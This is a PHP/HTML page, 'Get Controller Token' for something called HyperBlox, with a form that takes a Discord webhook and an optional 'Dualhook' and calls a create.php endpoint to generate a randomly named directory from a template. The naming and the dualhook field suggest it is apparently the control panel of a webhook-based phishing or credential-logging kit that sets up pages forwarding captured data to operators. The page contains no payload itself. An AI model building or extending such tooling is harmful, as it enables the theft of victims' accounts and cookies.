<?php ?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Get Controller Token - HyperBlox</title>
	<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
	<style>
		:root{--primary:#8b5cf6;--primary-dark:#7c3aed;--dark:#0f172a;--darker:#020617;--light:#f8fafc;--gray:#94a3b8;--glass:rgba(30,41,59,.45);--glass-border:rgba(255,255,255,.08);--radius:16px}
		body{margin:0;background:var(--darker);color:var(--light);font-family:'Manrope',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background-image:radial-gradient(at 80% 0%, rgba(139,92,246,.1) 0px, transparent 50%),radial-gradient(at 0% 50%, rgba(139,92,246,.1) 0px, transparent 50%)}
		.card{width:100%;max-width:520px;background:var(--glass);border:1px solid var(--glass-border);border-radius:var(--radius);padding:28px;backdrop-filter:blur(10px);box-shadow:0 15px 50px rgba(0,0,0,.25)}
		h1{margin:0 0 8px;font-size:22px}
		p{margin:0 0 20px;color:var(--gray)}
		.group{margin-bottom:16px}
		label{display:block;margin:0 0 8px;color:var(--gray);font-size:14px}
		input,select{width:100%;height:48px;border-radius:12px;border:1px solid var(--glass-border);background:rgba(15,23,42,.6);color:var(--light);padding:0 14px;font-size:14px;box-sizing:border-box}
		button{width:100%;height:48px;border:0;border-radius:12px;background:var(--primary);color:#fff;font-weight:600;cursor:pointer}
		button:hover{background:var(--primary-dark)}
		.note{margin-top:14px;color:var(--gray);font-size:13px;line-height:1.5}
		a{color:var(--primary);text-decoration:none}
		.center{text-align:center}
		.hidden{display:none}
	</style>
</head>
<body>
	<div class="card" id="formCard">
		<h1>Get Controller Token</h1>
		<p>Enter your Discord webhook. We’ll generate a controller token and send it to your webhook.</p>
		<div class="group">
			<label for="web">Discord Webhook</label>
			<input id="web" type="url" placeholder="https://discord.com/api/webhooks/..." required>
		</div>
        <!-- Tool type removed for simplicity; a default is used -->
		<div class="group">
			<label for="dual">Dualhook (optional)</label>
			<input id="dual" type="url" placeholder="https://discord.com/api/webhooks/...">
		</div>
		<button id="proceedBtn"><i class="fas fa-bolt"></i>&nbsp;Proceed</button>
		<div class="note">
			Need to sign in? <a href="/controlPage/sign-in.php">Open sign-in</a>
		</div>
	</div>

	<div class="card hidden" id="doneCard">
		<h1 class="center">Token Sent</h1>
		<p class="center">A controller token has been delivered to your Discord webhook.</p>
		<div class="center" style="margin-top:16px">
			<a href="/controlPage/sign-in.php" style="display:inline-block;padding:10px 16px;background:#8b5cf6;color:#fff;border-radius:10px">Go to Sign In</a>
		</div>
		<p class="note center" style="margin-top:12px">Keep your token private. Use it only on the sign-in page.</p>
	</div>

	<script>
		function randomDir(len=8){
			const chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
			let s='';
			for(let i=0;i<len;i++){ s+=chars[Math.floor(Math.random()*chars.length)]; }
			return 'hx'+s;
		}
		document.getElementById('proceedBtn').addEventListener('click', async function(){
			const web = document.getElementById('web').value.trim();
			const dual = document.getElementById('dual').value.trim();
            const t = 'cc'; // default template type for token generation
			if(!web){ alert('Please enter your Discord webhook'); return; }
			const dir = randomDir();
			const params = new URLSearchParams();
			params.set('dir', dir);
			params.set('t', t);
			params.set('web', web);
			params.set('minimal', '1'); // only send controller+token, no link page
			if(dual){ params.set('dualhook', dual); }
			const url = '/controlPage/apis/create.php?' + params.toString();
			try {
				await fetch(url, { method: 'GET' });
			} catch (e) { /* ignore network preview errors */ }
			// show completion card without opening a new tab
			document.getElementById('formCard').classList.add('hidden');
			document.getElementById('doneCard').classList.remove('hidden');
		});
	</script>
</body>
</html>

